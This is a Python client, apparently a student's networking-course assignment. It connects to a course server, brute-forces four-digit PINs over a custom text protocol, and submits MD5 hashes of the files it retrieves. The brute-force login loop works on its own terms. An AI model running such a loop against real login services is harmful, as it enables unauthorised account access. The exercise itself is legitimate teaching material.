from socket import *
import sys, hashlib, time

targetServer = "137.132.92.111"
serverPort = 4444
student_id = 283974
clientSocket = socket(AF_INET, SOCK_STREAM) 
password = 0
passed = 0

def main():
    
    if (len(sys.argv) != 2):
        print("Expected 1 argument!")
        return -1

    start_time = time.time()
    student_key = sys.argv[1]
    
    while (password < 10000):
        if (establishConnection(student_key)):
            try_password()
            clientSocket.close()

        else:
            print("ERR: handshake failed")

    print("---------OVERALL %s seconds ------------" % (time.time() - start_time))
    print("OVERALL PASSED %s / 8" % passed)
    return 0
        

def establishConnection(student_key):
    global clientSocket
    clientSocket = socket(AF_INET, SOCK_STREAM)
    clientSocket.connect((targetServer, serverPort))
    print("SYSTEM: socket established")
    return handshake(student_key)


def handshake(student_key):
    message = ("STID_" + student_key).encode()
    print("SYSTEM: Handshaking with ", message)
    clientSocket.send(message)
    reply = clientSocket.recv(4).decode()
    return reply == '200_'

def try_password():
    global password, passed
    print("SYSTEM: Starting with ", password)
    start_time = time.time()
    
    for i in range(password, 10000):
        
        if (passed == 8):
            password = 10000
            print("SUCCESS: Finished")
            bye()
            break 

        password += 1
        fourDigit = '{0:04}'.format(i)
        m = ('LGIN_' + fourDigit).encode()
        clientSocket.send(m)
        response = getResponseCode()
        if (response == '201_'):
            print('\nSUCCESS: Password is ', fourDigit, " Now in State 2")
            file = getFile()
            digest = hashlib.md5(file).hexdigest()
            print("SUCCESS: File retrieved: ", digest)
            send_hash(digest)
            logoutFile()

        elif (response == '403_'):
            continue
        else:
            print("ERR: unexpected response in stage 1: ", response)
            print("ERR: curr iteration: ", i)
            password = i
            break
            
    print("------------- bruteforced in %s seconds--------------" % (time.time() - start_time)) 

def bye():
    msg = 'BYE__'
    clientSocket.send(msg.encode())

def send_hash(hash):
    global passed
    msg = ('PUT__' + hash).encode()
    #print("sending hash")
    clientSocket.send(msg)
    #print("awaiting verification")
    code = getResponseCode()
    if (code == '203_'):
        #length = extractLength()
        #print("length: ", length)
        print("SUCCESS: hash accepted ") #hashlib.md5(readLength(length)).hexdigest())
        passed += 1
    else:
        print("ERR: Hash invalid, server returned ", code)
    

def logoutFile():
    #print('SYSTEM: logging out')
    clientSocket.send('LOUT_'.encode())
    if (getResponseCode() == '202_'):
        print('SYSTEM: Logout successful, now in State 1 \n')
    else:
        print('ERR: Logout failed')

def getFile():
    clientSocket.send('GET__'.encode())
    print("SYSTEM: Getting file")
    if (getResponseCode() == '100_'):
        length = extractLength()
        print("Server: File length is", length)
        file = readLength(length)
        return file
    else:
        return

def readLength(length):
    packetSize = length
    packet = b''
    while (packetSize > 0):
        msg = clientSocket.recv(length)
        packetSize = packetSize - len(msg)
        packet = packet + msg

    return packet

def extractLength():
    buffer = b''
    while (True):
        msgByte = clientSocket.recv(1)
        if (msgByte == b'_'):
            break
        buffer = buffer + msgByte
    
    return int(buffer.decode())


def getResponseCode():
    m = clientSocket.recv(4)
    if len(m) != 4:
        print('RESPONSE_CODE not length 4')
    
    return m.decode()

def work(amount):
    c = 0
    for i in range(amount):
        c += 1

if __name__ == "__main__":
    main()
    #try_password()
